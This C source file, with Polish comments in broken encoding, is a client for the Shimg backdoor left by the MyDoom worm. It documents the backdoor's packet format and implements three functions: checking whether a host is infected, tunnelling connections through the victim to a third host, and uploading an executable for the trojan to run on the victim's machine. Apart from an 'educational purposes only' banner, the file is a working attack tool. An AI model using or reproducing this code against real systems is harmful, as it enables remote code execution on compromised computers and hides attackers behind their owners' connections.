/*
 * klient MyDoom.c (Shimg)
 *
 * Robert Nowotniak <rob@submarine.ath.cx>
 * nie 01 lut 2004 21:27:20 CET
 *
 ***********************************************************************
 ************* Program _WY£¡CZNIE_ do celów edukacyjnych ***************
 ***********************************************************************
 *
 *
 * Koñ trojanski Shimg (instalowany przez MyDoom.A i mutacje)
 * standardowo nas³uchuje na porcie 3127 w oczekiwaniu na jedno
 * z dwu ¿±dañ: uruchomienie przes³anego pliku wykonywalnego
 * lub ustanowienie tunelowanego po³±czenia z trzecim hostem.
 *
 *
 * Format pakietów jest nastêpuj±cy:
 *
 ***********************************************************************
 *
 * 0000000: 0401 0fc8 c0a8 4201 00 474554202f2048    ......B..GET / H
 *          ^^1^ ^^2^ ^^^^3^^^^ ^4 ^^^^^^^^5^^^^^
 * 0000010: 5454 502f 312e 310a 486f 7374 3a20 7777  TTP/1.1.Host: ww
 * 0000020: 772e 6d69 6372 6f73 6f66 742e 636f 6d0a  w.microsoft.com.
 *  sent 0, rcvd 49
 *
 * 1  -- 2 bajty,  ¿±danie ustanowienia tunelu [\x04\x01]
 * 2  -- 2 bajty,  docelowy port w porz±dku sieciowym
 * 3  -- 4 bajty,  docelowy adres IP w porz±dku sieciowym
 * 4  -- 1 bajt,   separator ¿±dania od tunelowanych danych [\x00]
 * 5  --           dane do przes³ania ustanowionym tunelem
 *
 ***********************************************************************
 *
 * 0000000: 85 133c9ea2 4d5a900003000000040000       ..<..MZ.........
 *          ^1 ^^^^2^^^ ^^^^^^^^^^^3^^^^^^^^^^
 * 0000010: 00ff ff00 00b8 0000 0000 0000 0040 0000  .............@..
 * [...]
 * 0000050: 4ccd 2154 6869 7320 7072 6f67 7261 6d20  L.!This program 
 * 0000060: 6361 6e6e 6f74 2062 6520 7275 6e20 696e  cannot be run in
 * 0000070: 2044 4f53 206d 6f64 652e 0d0d 0a24 0000   DOS mode....$..
 *
 * 1  -- 1 bajt,   ¿±danie wykonania przes³anego programu [\x85]
 * 2  -- 4 bajty,  liczba potwierdzaj±ca [\x13\x3C\x9E\xA2]
 * 3  --           dane zawieraj±ce program do uruchomienia
 *
 ***********************************************************************
 *
 *
 */



#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <locale.h>



#define DEFAULT_SHIMG_PORT   3127
#define DEFAULT_PROXY_PORT   6060
#define DEFAULT_LISTEN_PORT  2731
#define DEFAULT_FORWARD_PORT 80
#define HOST_MAXLEN          70
#define TIMEOUT		        15

/* Takie dane bêd± wys³ane w celu rozpoznania Shimg */
#define TOUCH_CONTENT  {'\001'}
/* Takie dane oznaczaj± wykrycie Shimg */
#define MYDOOM_FGRPRNT {'\x04','\x5B','\x00','\x00','\x00','\x00','\x00','\x00'}

/* ¯±danie uruchomienia programu */
#define RUN_CONTENT    {'\x85','\x13','\x3C','\x9E','\xA2'}
/* ¯±danie zestawienia tunelu */
#define FORW_CONTENT   {'\x04','\x01','\x00','\x00','\x00','\x00','\x00','\x00','\000'}

#define PROXY_RESP "HTTP/1.0 200 Connection established"

#ifndef BUFLEN
#define BUFLEN 200
#endif

#ifndef HAVE_SIN_LEN
/* Na GNU/Linux to ma byæ 0, na Uniksie to ma byæ 1 */
#define HAVE_SIN_LEN 0
#endif


const char *ARGV0;
struct sockaddr_in VICTIM_ADDR;
struct sockaddr_in PROXY_ADDR;

void usage(void);
void baner(void);
void Blad(const char *str);
int  Polacz(const struct sockaddr_in *cel);
void Do_Touch(void);
void Do_Forward(const char *dst, int input);
void Do_Run(const char *nazwa);
void Nasluchuj(const char *listen_loc, const char *dst);
void Ustal_Adres(struct sockaddr_in *dst, const char *src, uint16_t def_port);



int main(int argc, char * const *argv)
{
	int ch;
	int touch = 0;
	char *forward = NULL, *run = NULL;
	char *listen = NULL, *proxy = NULL;

	setlocale(LC_ALL, "");
	signal(SIGPIPE, SIG_IGN);

	if( NULL == (ARGV0 = argv[0]) )
		exit(EXIT_FAILURE);
	if( argc < 2 )
		usage();

	while( (ch=getopt(argc, argv, "f:r:thl:p:")) != -1 )
	{
		switch(ch) {
			case 'f':
				forward = optarg;
				break;
			case 'r':
				run = optarg;
				break;
			case 't':
				touch = 1;
				break;
			case 'l':
				listen = optarg;
				break;
			case 'p':
				proxy = optarg;
				break;
			case '?':
			case 'h':
			default:
				usage();
		}
	}
	argc -= optind;
	argv += optind;
	if( argc != 1 )
		usage();
	if( ! touch && ! forward && ! run )
		touch = 1;

	baner();

	Ustal_Adres(&VICTIM_ADDR, *argv, DEFAULT_SHIMG_PORT);
	if( proxy )
		Ustal_Adres(&PROXY_ADDR, proxy, DEFAULT_PROXY_PORT);

	if( touch )
		Do_Touch();

	if( run )
		Do_Run(run);

	if( listen && forward )
		Nasluchuj(listen, forward);
	else if( forward )
		Do_Forward(forward, 0);


	exit(EXIT_SUCCESS);
}


/*---------------------------------------------------------
--- Definicje funkcji {{{ ---------------------------------
---------------------------------------------------------*/

/*
 * Przyjmuje wska¼nik src na ³añcuch znaków (ip lub nazwa hosta)
 * i wype³nia strukturê sockaddr_in, wskazywan± przez dst.
 */
void Ustal_Adres(struct sockaddr_in *dst, const char *src, uint16_t def_port)
{
	char *port;
	char Adres[HOST_MAXLEN];
	struct hostent *he1;

	if( ! src || ! dst )
		return;

	strncpy(Adres, src, sizeof(Adres));
	Adres[sizeof(Adres)-1] = '\0';

	memset((void*)dst, '\0', sizeof(*dst));

#if defined(HAVE_SIN_LEN) && HAVE_SIN_LEN != 0
	dst->sin_len    = sizeof(struct in_addr);
#endif
	dst->sin_family = AF_INET;

	if( (port=index(Adres, ':')) && *(port+1) )
	{
		*port = '\0';
		dst->sin_port = htons(atoi(port+1));
	}
	else
		dst->sin_port = htons(def_port);

	if( (dst->sin_addr.s_addr=inet_addr(Adres)) == INADDR_NONE )
	{
		he1 = gethostbyname2(Adres, AF_INET);
		if( ! he1 || ! he1->h_addr_list[0] )
		{
			fprintf(stderr,
					"B³±d: Nie uda³o siê rozpoznaæ podanego adresu (%s).\n", src);
			exit(EXIT_FAILURE);
		}
		dst->sin_addr.s_addr = *(in_addr_t*)(he1->h_addr_list[0]);
		printf("[i] Nazwa %s wskazuje na adres %s\n", Adres, inet_ntoa(dst->sin_addr));
		endhostent();
	}
}

/*
 * Wy¶wietla komunikat o b³êdze na podstawie warto¶ci errno
 */
void Blad(const char *str)
{
	char *buf;

	if( ! str )
		return;

	if( NULL == (buf = malloc(strlen(str)+4+1)) )
		exit(EXIT_FAILURE);

	sprintf(buf, "[B] %s", str);

	perror(buf);
	exit(EXIT_FAILURE);
}

/*
 * Tworzy gniazdo internetowe i ustanawia po³±czenie z celem
 */
int Polacz(const struct sockaddr_in *cel)
{
	int fd;
	int ver, status, err;
	FILE *proxy;
	char buf[80];
	struct timeval tv1 = { TIMEOUT, 0 };

	if( ! cel )
		return -1;

	if( PROXY_ADDR.sin_addr.s_addr == (in_addr_t)0
			|| ( PROXY_ADDR.sin_port == cel->sin_port
				&& PROXY_ADDR.sin_addr.s_addr == cel->sin_addr.s_addr ) )
	{
		/* £±czenie bezpo¶rednie */

		if( (fd=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0 )
			Blad("socket()");
		if( connect(fd, (struct sockaddr *)cel, sizeof(*cel)) < 0 )
			Blad("connect()");

	}
	else
	{
		/* Próba ³±czenia przez proxy */

		fprintf(stderr, "[i] £±czenie z proxy...\n");

		fd = Polacz(&PROXY_ADDR);

		if( setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (void*)&tv1, sizeof(tv1)) < 0 )
			Blad("setsockopt()");
		if( NULL == (proxy=fdopen(fd, "r+")) )
			Blad("fdopen()");

		fprintf(proxy, "CONNECT %s:%d HTTP/1.1\r\n\r\n",
				inet_ntoa(cel->sin_addr), ntohs(cel->sin_port));


		if( (err=fscanf(proxy, "HTTP/1.%d %d ", &ver, &status)) != 2
				|| NULL == fgets(buf, sizeof(buf), proxy)
				|| NULL == fgets(buf, sizeof(buf), proxy) )
		{
			if( err != -1 && err != 2 )
			{
				fprintf(stderr,
						"[B] Niezrozumia³a odpowied¼ od serwera proxy.\n");
				exit(EXIT_FAILURE);
			}
			else if( errno == EWOULDBLOCK )
			{
				fprintf(stderr,
						"[B] Brak odpowiedzi od proxy w ci±gu %ds\n", TIMEOUT);
				exit(EXIT_FAILURE);
			}
			else
				Blad("fgets()");
		}

		if( ver != 0 && ver != 1 )
		{
			fprintf(stderr, "[B] B³êdna odpowied¼ od proxy.\n");
			exit(EXIT_FAILURE);
		}

		if( status != 200 )
		{
			fprintf(stderr, "[B] Proxy nie uda³o siê nawi±zaæ po³±czenia.\n");
			fprintf(stderr, "[B]    Status odpowiedzi od serwera: %d\n", status);
			exit(EXIT_FAILURE);
		}

		printf("[i] Serwer proxy ustanowi³ po³±czenie.\n");

	}

	return fd;
}


/*
 * Otwiera port na adresie listen_loc i serwuje ³±cz±cym siê klientom
 * tunelowane po³±czenie z dst.
 */
void Nasluchuj(const char *listen_loc, const char *dst)
{
	int listen_fd, client_fd;
	struct sockaddr_in listen_addr, client_addr;
	socklen_t addr_len = sizeof(struct sockaddr_in);

	if( ! listen_loc || ! *listen_loc )
		return;

	Ustal_Adres(&listen_addr, listen_loc, DEFAULT_LISTEN_PORT);

	if( (listen_fd=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0 )
		Blad("socket()");
	if( bind(listen_fd, (struct sockaddr*)&listen_addr, sizeof(listen_addr)) < 0 )
		Blad("bind()");
	if( listen(listen_fd, 3) < 0 )
		Blad("listen()");

	fprintf(stderr, "[*] Oczekiwanie na po³±czenie klienta...\n");

	if( (client_fd=accept(listen_fd, (struct sockaddr *) &client_addr, &addr_len)) < 0 )
		Blad("accept()");

	fprintf(stderr, "[i] Nadesz³o po³±czenie z %s:%d...\n",
			inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

	Do_Forward(dst, client_fd);
}



/*
 * Sprawdzenie, czy na serwerze dzia³a Shimg
 */
void Do_Touch(void)
{
	int fd, n, len;
	char zapyt[] = TOUCH_CONTENT;
	char oczek[] = MYDOOM_FGRPRNT;
	char odpow[sizeof(oczek)];
	struct timeval tv1 = { TIMEOUT, 0 };


	printf("[*] Sprawdzanie dostêpno¶ci portu %d na serwerze %s...\n",
			ntohs(VICTIM_ADDR.sin_port), inet_ntoa(VICTIM_ADDR.sin_addr));

	fd = Polacz(&VICTIM_ADDR);

	if( send(fd, (void*)zapyt, sizeof(zapyt), 0) != sizeof(zapyt) )
		Blad("send()");


	if( setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (void*)&tv1, sizeof(tv1)) < 0 )
		Blad("setsockopt()");

	if( (len=recv(fd, (void*)odpow, sizeof(odpow), 0)) < 0 )
	{
		if( errno == EWOULDBLOCK )
		{
			fprintf(stderr,
					"[B] Port otwarty, ale brak odpowiedzi w ci±gu %ds\n", TIMEOUT);
			exit(EXIT_FAILURE);
		}
		else
			Blad("recv()");
	}

	printf("[i] Odpowied¼ od serwera:\n[i] ");
	if( len )
		for( n=0; n<len; ++n )
			printf("0x%X ", odpow[n]);
	else
		printf("(brak)");
	printf("\n");

	if( len != sizeof(oczek) || memcmp(odpow, oczek, sizeof(oczek) ) )
		printf("[!] Port otwarty, ale odpowied¼ nie przypomina trojana MyDoom.\n");
	else
		printf("[!] W podanym po³o¿eniu dzia³a trojan MyDoom (shimg).\n");

	if( close(fd) < 0 )
		Blad("close()");

}

/*
 * Zestawienie tunelu do dst, wykorzystuj±c komputer z Shimg jako proxy
 * input to deskryptor, z którego przychodz± dane do przesy³ania.
 */
void Do_Forward(const char *dst, int input)
{
	int victim_fd;
	int wczytane, zapisane;
	struct sockaddr_in cel;
	char HEADER[] = FORW_CONTENT;
	char RESP[sizeof(HEADER) - 1];
	char bufor;
	int max;
	fd_set orig_rdfds, rdfds;

	if( ! dst || ! *dst )
		return;

	Ustal_Adres(&cel, dst, DEFAULT_FORWARD_PORT);
	*(uint16_t*)&(HEADER[2]) = cel.sin_port;
	*(uint32_t*)&(HEADER[4]) = cel.sin_addr.s_addr;


	printf("[*] Ustanawianie po³±czenia z %s:%d ",
			inet_ntoa(cel.sin_addr), ntohs(cel.sin_port));
	printf("poprzez %s:%d...\n",
			inet_ntoa(VICTIM_ADDR.sin_addr), ntohs(VICTIM_ADDR.sin_port));

	victim_fd = Polacz(&VICTIM_ADDR);

	if( write(victim_fd, (void*)HEADER, sizeof(HEADER)) != sizeof(HEADER) )
		Blad("write()");
	if( read(victim_fd, (void*)RESP, sizeof(RESP)) < 0 )
		Blad("read()");

	HEADER[1] = 0x5A;
	if( memcmp( HEADER, RESP, sizeof(RESP) ) )
	{
		printf("[B] Trojan Shimg odpowiedzia³, ¿e nie mo¿e siê po³±czyæ.\n");
		exit(EXIT_FAILURE);
	}
	printf("[!] Trojan Shimg odpowiedzia³, ¿e nawi±za³ po³±czenie.\n");


	if( fcntl(victim_fd, F_SETFL, O_NONBLOCK) < 0 )
		Blad("fcntl()");
	if( fcntl(input, F_SETFL, O_NONBLOCK) < 0 )
		Blad("fcntl()");

	max = ( (victim_fd>input)?victim_fd:input ) + 1;
	FD_ZERO(&orig_rdfds);
	FD_SET(victim_fd, &orig_rdfds);
	FD_SET(input, &orig_rdfds);

	for(;;)
	{
		rdfds = orig_rdfds;
		if( select( max, &rdfds, NULL, NULL, NULL ) < 0 )
			Blad("select()");

		if( FD_ISSET(input, &rdfds) )
		{
			wczytane = read(input, &bufor, 1);
			if( wczytane == 0 )
				break;
			else if( wczytane < 0 )
				Blad("read()");
			do
				zapisane = write(victim_fd, &bufor, 1);
			while( zapisane < 0 && errno == EWOULDBLOCK );
			if( zapisane < 0 )
				Blad("write()");
		}

		if( FD_ISSET(victim_fd, &rdfds) )
		{
			wczytane = read(victim_fd, &bufor, 1);
			if( wczytane == 0 )
				break;
			else if( wczytane < 0 )
				Blad("read()");
			do
				zapisane = write(input, &bufor, 1);
			while( zapisane < 0 && errno == EWOULDBLOCK );
			if( zapisane < 0 )
				Blad("write()");
		}
	}

	if( close(victim_fd) < 0 )
		Blad("close()");

	printf("\n[*] Po³±czenie zosta³o zamkniête.\n");

}

/*
 * Wys³anie programu do trojana i ¿±dania uruchomienia
 */
void Do_Run(const char *nazwa)
{
	int serw, plik;
	int wczytane;
	char RUN[] = RUN_CONTENT;
	char bufor[BUFLEN];

	if( ! nazwa || ! *nazwa )
		return;

	printf("[*] Wysy³anie pliku (%s) do uruchomienia przez trojana...\n", nazwa);

	if( (plik = open(nazwa, O_RDONLY)) < 0 )
		Blad("open()");
	serw = Polacz(&VICTIM_ADDR);

	if( send(serw, (void*)RUN, sizeof(RUN), 0) != sizeof(RUN) )
		Blad("send()");

	do
	{
		wczytane = read(plik, (void*)bufor, sizeof(bufor));
		if( wczytane < 0 )
			Blad("read()");
		if( write(serw, (void*)bufor, wczytane) != wczytane )
			Blad("write()");
	} while( wczytane );

	if( close(plik) < 0 )
		Blad("close()");
	if( close(serw) < 0 )
		Blad("close()");

	printf("[!] OK. Plik zosta³ przes³any na podany adres.\n");
}

void baner(void)
{
	printf("--------------------------------------------------\n");
	printf("****         klient MyDoom.c (shimg)         *****\n");
	printf("****       nie 01 lut 2004 21:27:20 CET      *****\n");
	printf("**** Robert Nowotniak <rob@submarine.ath.cx> *****\n");
	printf("--------------------------------------------------\n");
	printf("*** Program _WY£¡CZNIE_ do celów edukacyjnych. ***\n");
	printf("--------------------------------------------------\n");
	printf("\n");
}

void usage(void)
{
	fprintf(stderr, "\n");
	fprintf(stderr, " U¿ycie:\n");
	fprintf(stderr,
		"%s [-t] [[-l <adres[:port]>] -f <Adres_Docelowy[:port]>]\n"
		"\t[-p <Proxy[:port]>] [-r <Plik.exe>] <Cel_Ataku[:port]>\n", ARGV0);
	fprintf(stderr, "\n");
	fprintf(stderr,
		"  -t   Sprawdzenie, czy w podanej lokalizacji dzia³a trojan MyDoom (shimg)\n");
	fprintf(stderr,
		"  -f   Zestawienie tunelowanego po³±czenia z Adresem_Docelowym (forwarding)\n");
	fprintf(stderr,
		"  -r   Uruchomienie podanego <Pliku.exe> na atakowanym komputerze\n");
	fprintf(stderr,
		"  -p   Wykonywanie wszyskich dzia³añ przez proxy (metoda CONNECT)\n");
	fprintf(stderr,
		"  -l   Nas³uchiwanie na porcie w celu tunelowania\n");
	fprintf(stderr, "\n");

	exit(EXIT_FAILURE);
}
/*---------------------------------------------------------
------------------------------------ }}} ------------------
---------------------------------------------------------*/

/* vim: set ts=3 sw=3 fdm=marker: */
